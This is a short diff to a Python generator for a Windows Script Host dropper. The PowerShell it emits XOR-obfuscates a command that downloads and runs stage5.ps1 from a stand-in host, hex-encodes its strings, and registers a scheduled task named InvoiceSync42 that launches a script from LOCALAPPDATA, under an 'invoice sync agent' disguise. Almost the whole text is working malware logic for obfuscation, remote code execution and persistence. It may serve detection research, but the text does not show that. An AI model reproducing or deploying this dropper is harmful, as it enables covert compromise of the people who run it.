@@ -1121,15 +1121,18 @@ def wsh_selfread_dropper_js() -> bytes:
     def hx(t: str) -> str:
         return t.encode().hex().upper()
 
+    task_xml = ('<Exec><Command>wscript.exe</Command><Arguments>//B //NoLogo '
+                '"%LOCALAPPDATA%\\InvoiceSync\\manifest.js"</Arguments></Exec>')
+    dl = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/stage5.ps1')"
     ps = "\r\n".join([
         "# invoice-2024-0613 sync agent",
-        f"$r1=@({xr('IEX (New-Object Net.WebClient).DownloadString(\'http://billing-portal.example/inv/stage5.ps1\')', 70)})",
+        f"$r1=@({xr(dl, 70)})",
         "$rk1=070",
         "$rs1=-join($r1|ForEach-Object{[char]([int]$_-bxor$rk1)})",
         "$h2s = { param($h) $o=New-Object Text.StringBuilder; $i=0; while($i-lt$h.Length){ "
         "[void]$o.Append([char][Convert]::ToInt32($h.Substring($i,2),16)); $i+=2 } $o.ToString() }",
         f"$svc = & $h2s '{hx('Schedule.Service')}'",
-        f"$cmd = & $h2s '{hx('<Exec><Command>wscript.exe</Command><Arguments>//B //NoLogo "%LOCALAPPDATA%\\InvoiceSync\\manifest.js"</Arguments></Exec>')}'",
+        f"$cmd = & $h2s '{hx(task_xml)}'",
         "$ts = New-Object -ComObject $svc; $ts.Connect()",
         "$null = $ts.GetFolder('\\').RegisterTask('\\InvoiceSync42', $cmd, 6, $null, $null, 3, $null)",
         "& ([scriptblock]::Create($rs1))",
